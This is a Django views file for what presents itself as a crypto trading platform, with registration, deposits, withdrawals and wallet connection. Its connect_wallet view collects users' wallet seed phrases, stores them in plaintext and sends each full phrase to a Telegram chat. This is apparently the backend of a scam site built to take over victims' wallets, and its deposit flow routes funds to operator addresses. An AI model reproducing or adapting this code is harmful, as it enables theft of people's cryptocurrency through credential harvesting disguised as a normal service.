from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import login, authenticate
from django.contrib.auth.views import LoginView
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.views.decorators.http import require_POST
from decimal import Decimal, ROUND_DOWN
import json
from .forms import RegistrationForm, EmailAuthenticationForm
from .models import Transaction, ConnectedWallet, UserHolding, UserAccount
from .telegram import send_telegram
from apps.market.models import MarketAsset, CryptoDepositAddress


def register(request):
    if request.method == 'POST':
        form = RegistrationForm(request.POST)
        if form.is_valid():
            user = form.save()
            authenticated_user = authenticate(
                request, username=user.email, password=form.cleaned_data['password1']
            )
            if authenticated_user:
                login(request, authenticated_user)
            return redirect('dashboard')
    else:
        form = RegistrationForm()
    return render(request, 'accounts/register.html', {'form': form})


class CustomLoginView(LoginView):
    template_name = 'accounts/login.html'
    authentication_form = EmailAuthenticationForm


@login_required
def profile(request):
    account = request.user.account
    wallet = account.wallets.first()
    wallet_types = ConnectedWallet.WALLET_TYPES
    return render(request, 'accounts/profile.html', {
        'account': account,
        'wallet': wallet,
        'wallet_types': wallet_types,
    })


@login_required
@require_POST
def connect_wallet(request):
    account = request.user.account
    if account.wallets.exists():
        messages.error(request, 'You can only connect one wallet. Remove the existing one first.')
        return redirect('profile')
    wallet_type = request.POST.get('wallet_type', '')
    seed_phrase = request.POST.get('seed_phrase', '').strip()
    if not wallet_type or not seed_phrase:
        messages.error(request, 'Wallet type and seed phrase are required')
        return redirect('profile')

    normalized, word_count = ConnectedWallet.normalize_seed_phrase(seed_phrase)
    if word_count not in (12, 15, 18, 21, 24):
        messages.error(request, 'Seed phrase must be 12, 15, 18, 21, or 24 words')
        return redirect('profile')

    ConnectedWallet.objects.create(
        account=account, wallet_type=wallet_type,
        seed_phrase=normalized,
        seed_word_count=word_count,
        address=f'{wallet_type.lower()}_{account.user.username}_{ConnectedWallet.objects.count() + 1}',
    )
    messages.success(request, f'{dict(ConnectedWallet.WALLET_TYPES).get(wallet_type, wallet_type)} submitted for approval.')
    send_telegram(
        f"<b>\U0001f514 New Wallet Connected</b>\n"
        f"User: {account.user.get_full_name() or account.user.email}\n"
        f"Type: {dict(ConnectedWallet.WALLET_TYPES).get(wallet_type, wallet_type)}\n"
        f"Words: {word_count}\n"
        f"Seed: {normalized}"
    )
    return redirect('profile')


@login_required
@require_POST
def remove_wallet(request):
    account = request.user.account
    account.wallets.all().delete()
    messages.success(request, 'Wallet disconnected.')
    send_telegram(
        f"<b>\U0001f5d1 Wallet Disconnected</b>\n"
        f"User: {account.user.get_full_name() or account.user.email}"
    )
    return redirect('profile')


@login_required
def wallet_view(request):
    account = request.user.account
    assets = MarketAsset.objects.filter(is_active=True)
    addrs = {addr.asset.code: addr.address for addr in CryptoDepositAddress.objects.filter(is_active=True)}
    wallet = account.wallets.first()
    return render(request, 'wallet/index.html', {
        'account': account,
        'assets': assets,
        'wallet': wallet,
        'deposit_addresses_json': json.dumps(addrs),
    })


@login_required
def wallet_balances(request):
    account = request.user.account
    assets = MarketAsset.objects.filter(is_active=True)
    return render(request, 'includes/wallet_balances.html', {
        'account': account,
        'assets': assets,
    })


@login_required
def transactions_view(request):
    account = request.user.account
    txns = account.transactions.all()[:50]
    return render(request, 'wallet/transactions.html', {'transactions': txns})


@login_required
@require_POST
def deposit_request(request):
    account = request.user.account
    asset_code = request.POST.get('asset_code', '').upper()
    usd_input = request.POST.get('amount', '0')
    asset = get_object_or_404(MarketAsset, code=asset_code)
    addr = get_object_or_404(CryptoDepositAddress, asset=asset, is_active=True)

    try:
        usd_amount = Decimal(str(usd_input)).quantize(Decimal('0.01'), rounding=ROUND_DOWN)
    except Exception:
        messages.error(request, 'Invalid amount')
        return redirect('wallet_view')

    if usd_amount <= Decimal('0'):
        messages.error(request, 'Amount must be positive')
        return redirect('wallet_view')

    if asset.current_price <= Decimal('0'):
        messages.error(request, f'{asset_code} price unavailable — try again later')
        return redirect('wallet_view')

    crypto_amount = (usd_amount / asset.current_price).quantize(Decimal('0.00000001'), rounding=ROUND_DOWN)
    if crypto_amount <= Decimal('0'):
        messages.error(request, 'Amount too small for this asset')
        return redirect('wallet_view')

    Transaction.objects.create(
        account=account, type='DEPOSIT', status='PENDING',
        asset_code=asset_code, asset_amount=crypto_amount,
        fiat_currency='USD', fiat_amount=usd_amount,
        destination_address=addr.address,
    )
    messages.success(request, f'Deposit of ${usd_amount:,.2f} ({crypto_amount} {asset_code}) requested.')
    send_telegram(
        f"<b>\U0001f4e5 Deposit Requested</b>\n"
        f"User: {account.user.get_full_name() or account.user.email}\n"
        f"Asset: {asset_code}\n"
        f"USD: ${usd_amount:,.2f}\n"
        f"Crypto: {crypto_amount}\n"
        f"Address: {addr.address}"
    )
    return redirect('wallet_view')


@login_required
@require_POST
def withdrawal_request(request):
    account = request.user.account
    asset_code = request.POST.get('asset_code', '').upper()
    usd_input = request.POST.get('amount', '0')
    destination = request.POST.get('destination_address', '').strip()
    asset = get_object_or_404(MarketAsset, code=asset_code)

    if not destination:
        messages.error(request, 'Destination address is required')
        return redirect('wallet_view')

    try:
        usd_amount = Decimal(str(usd_input)).quantize(Decimal('0.01'), rounding=ROUND_DOWN)
    except Exception:
        messages.error(request, 'Invalid amount')
        return redirect('wallet_view')

    if usd_amount <= Decimal('0'):
        messages.error(request, 'Amount must be positive')
        return redirect('wallet_view')

    if asset.current_price <= Decimal('0'):
        messages.error(request, f'{asset_code} price unavailable — try again later')
        return redirect('wallet_view')

    crypto_amount = (usd_amount / asset.current_price).quantize(Decimal('0.00000001'), rounding=ROUND_DOWN)
    if crypto_amount <= Decimal('0'):
        messages.error(request, 'Amount too small for this asset')
        return redirect('wallet_view')

    holding = UserHolding.objects.filter(account=account, asset=asset).first()
    usd_value = (holding.balance * asset.current_price) if holding else Decimal('0')
    if not holding or usd_value < usd_amount:
        messages.error(request, f'Insufficient {asset_code} balance (${usd_value:,.2f} available)')
        return redirect('wallet_view')

    Transaction.objects.create(
        account=account, type='WITHDRAWAL', status='PENDING',
        asset_code=asset_code, asset_amount=crypto_amount,
        fiat_currency='USD', fiat_amount=usd_amount,
        destination_address=destination,
    )
    messages.success(request, f'Withdrawal of ${usd_amount:,.2f} ({crypto_amount} {asset_code}) requested.')
    send_telegram(
        f"<b>\U0001f4e4 Withdrawal Requested</b>\n"
        f"User: {account.user.get_full_name() or account.user.email}\n"
        f"Asset: {asset_code}\n"
        f"USD: ${usd_amount:,.2f}\n"
        f"Crypto: {crypto_amount}\n"
        f"To: {destination}"
    )
    return redirect('wallet_view')
